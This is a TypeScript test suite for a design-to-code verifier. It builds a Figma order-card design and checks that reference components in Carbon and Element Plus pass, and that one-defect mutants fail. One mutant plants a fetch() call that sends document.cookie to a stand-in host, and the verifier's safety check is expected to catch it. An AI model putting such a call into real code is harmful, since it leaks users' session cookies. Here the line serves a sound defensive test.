// The regression gate: a design we wrote ourselves (an order card, built here as Figma's own REST JSON,
// so it lives in the public repo and CI needs no Figma cache) and a hand-written reference implementation
// per project in cli/test/golden. The reference must pass every check that runs, and each one-defect
// mutant must fail the right check. A change to the verifier, an adapter or a design system's version that
// breaks either fails CI, with no model and no spend.

import { existsSync, readdirSync, readFileSync } from "node:fs";
import { mkdir, rm, writeFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { Check, VerifyReport } from "@tulpar/core";
import { loadContext, verifyEntry } from "../../src/pipeline.ts";
import { loadProject, withAdapter } from "../../src/project.ts";

const repo = resolve(import.meta.dirname, "../../..");
const golden = import.meta.dirname;

/** The design system's own scale: each project's card is drawn in sizes its tokens have. */
interface Scale {
  font: string;
  title: [size: number, lineHeight: number];
  body: [size: number, lineHeight: number];
  padding: number;
  gap: number;
}

/** The order card as Figma's REST JSON: a vertical auto layout, 320 wide, a title and a summary line. */
export function orderCard(s: Scale) {
  const inner = 320 - 2 * s.padding;
  const titleY = s.padding;
  const bodyY = titleY + s.title[1] + s.gap;
  const text = (id: string, name: string, characters: string, y: number, [size, line]: [number, number], grey: number) => ({
    id,
    name,
    type: "TEXT",
    absoluteBoundingBox: { x: s.padding, y, width: inner, height: line },
    characters,
    style: { fontFamily: s.font, fontWeight: 400, fontSize: size, lineHeightPx: line, textAlignHorizontal: "LEFT", textAlignVertical: "TOP" },
    fills: [{ type: "SOLID", color: { r: grey, g: grey, b: grey, a: 1 } }],
    layoutSizingHorizontal: "FILL",
    layoutSizingVertical: "HUG",
  });
  return {
    document: {
      id: "900:1",
      name: "Order card",
      type: "FRAME",
      absoluteBoundingBox: { x: 0, y: 0, width: 320, height: bodyY + s.body[1] + s.padding },
      fills: [{ type: "SOLID", color: { r: 1, g: 1, b: 1, a: 1 } }],
      layoutMode: "VERTICAL",
      itemSpacing: s.gap,
      paddingTop: s.padding,
      paddingRight: s.padding,
      paddingBottom: s.padding,
      paddingLeft: s.padding,
      primaryAxisAlignItems: "MIN",
      counterAxisAlignItems: "MIN",
      children: [text("900:2", "Title", "Order summary", titleY, s.title, 0.09), text("900:3", "Body", "Two items, ready to ship.", bodyY, s.body, 0.32)],
    },
    components: {},
    componentSets: {},
    styles: {},
  };
}

export interface Case {
  project: string;
  /** The reference folder in cli/test/golden. */
  reference: string;
  entry: string;
  /** The file holding the styles (the entry itself for a single-file component). */
  style: string;
  test: string;
  /** A line of the entry's script after which a planted call goes. */
  script: string;
  scale: Scale;
  /** Present when the project is installed. */
  needs: string;
}

export const cases: Record<string, Case> = Object.fromEntries(([
  {
    project: "examples/carbon-react",
    reference: "carbon-react",
    entry: "OrderCard.tsx",
    style: "OrderCard.css",
    test: "OrderCard.test.tsx",
    script: "export default function OrderCard() {",
    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
    needs: "node_modules/@carbon/react",
  },
  {
    project: "examples/carbon-svelte",
    reference: "carbon-svelte",
    entry: "OrderCard.svelte",
    style: "OrderCard.svelte",
    test: "OrderCard.test.ts",
    script: '<script lang="ts">',
    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
    needs: "node_modules/carbon-components-svelte",
  },
  {
    project: "examples/carbon-angular",
    reference: "carbon-angular",
    entry: "order-card.component.ts",
    style: "order-card.component.css",
    test: "order-card.component.spec.ts",
    script: 'import { ChangeDetectionStrategy, Component, input } from "@angular/core";',
    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
    needs: "node_modules/carbon-components-angular",
  },
  {
    project: "examples/element-plus",
    reference: "element-plus",
    entry: "OrderCard.vue",
    style: "OrderCard.vue",
    test: "OrderCard.test.ts",
    script: '<script setup lang="ts">',
    scale: { font: "Inter", title: [20, 24], body: [14, 24], padding: 20, gap: 0 },
    needs: "node_modules/element-plus",
  },
] satisfies Case[]).map((c) => [c.reference, c]));

type Files = Record<string, string>;
const edit = (files: Files, file: string, change: (s: string) => string): Files => ({ ...files, [file]: change(files[file]!) });
const mutants: { name: string; mutate: (f: Files, c: Case) => Files; fails: Check["id"]; detail: RegExp }[] = [
  {
    name: "hard-coded colour",
    mutate: (f, c) => edit(f, c.style, (s) => s.replace(/(\n\s*color: )var\(--[\w-]+, (#[0-9a-f]{6})\)/, "$1$2")),
    fails: "colors",
    detail: /#[0-9a-f]{6}/,
  },
  {
    name: "wrong text",
    mutate: (f, c) => edit(f, c.entry, (s) => s.replace("Order summary", "Order sumary")),
    fails: "text",
    detail: /Order sumary/,
  },
  {
    name: "no padding: everything inside sits in the corner",
    mutate: (f, c) => edit(f, c.style, (s) => s.replace(/\n\s*padding: var\([^\n]*;/, "")),
    fails: "layout",
    detail: /900:2|900:3/,
  },
  {
    name: "planted call that sends cookies to another server",
    mutate: (f, c) => edit(f, c.entry, (s) => s.replace(c.script, `${c.script}\nfetch("https://collect.example/?c=" + document.cookie);`)),
    fails: "safety",
    detail: /fetch\(\) calls the network/,
  },
  {
    name: "a test that fails",
    mutate: (f, c) => edit(f, c.test, (s) => s.replace("Two items, ready to ship.", "Three items")),
    fails: "tests",
    detail: /./,
  },
];

const failing = (r: VerifyReport) => r.checks.filter((c) => c.status === "fail").map((c) => `${c.id}: ${c.summary}\n  ${c.details.filter((d) => d.startsWith("✗")).join("\n  ")}`);

/** The gate for one project: call from a test file (one per project, so they run in parallel). */
export function goldenSuite(c: Case): void {
  const root = join(repo, c.project);
  describe.skipIf(!existsSync(join(root, c.needs)))(`golden: ${c.reference}`, { timeout: 180_000 }, () => {
    const reference: Files = Object.fromEntries(readdirSync(join(golden, c.reference)).map((f) => [f, readFileSync(join(golden, c.reference, f), "utf8")]));
    const design = orderCard(c.scale);
    const work = join(root, ".tulpar", "golden");

    async function run(name: string, files: Files): Promise<VerifyReport> {
      const folder = name.replace(/[^a-z0-9]+/gi, "-").toLowerCase();
      const dir = join(work, folder);
      await mkdir(dir, { recursive: true });
      for (const [f, content] of Object.entries(files)) await writeFile(join(dir, f), content);
      const rel = (f: string) => `.tulpar/golden/${folder}/${f}`;
      const project = await loadProject(root);
      return withAdapter(project, async (host) => {
        const ctx = await loadContext(host, project, { frame: "900:1", node: design }, join(repo, "out"), join(repo, ".cache/figma"));
        return (await verifyEntry(host, project, ctx, rel(c.entry), undefined, rel(c.test))).report;
      });
    }

    let baseline: VerifyReport;
    beforeAll(async () => {
      baseline = await run("reference", reference);
    }, 180_000);
    afterAll(() => rm(work, { recursive: true, force: true }));

    it("passes the reference: no check fails, and the core checks ran", () => {
      expect(failing(baseline)).toEqual([]);
      const ran = baseline.checks.filter((x) => x.status === "pass").map((x) => x.id);
      for (const id of ["build", "render", "colors", "type", "spacing", "layout", "text", "tests", "safety"] as const) expect(ran, `${id} did not pass`).toContain(id);
    });

    for (const m of mutants) {
      it(`catches: ${m.name}`, async () => {
        const files = m.mutate(reference, c);
        expect(files).not.toEqual(reference);
        const report = await run(m.name, files);
        const check = report.checks.find((x) => x.id === m.fails)!;
        expect(check.status, failing(report).join("\n")).toBe("fail");
        expect(check.details.join("\n") + check.summary).toMatch(m.detail);
      });
    }
  });
}
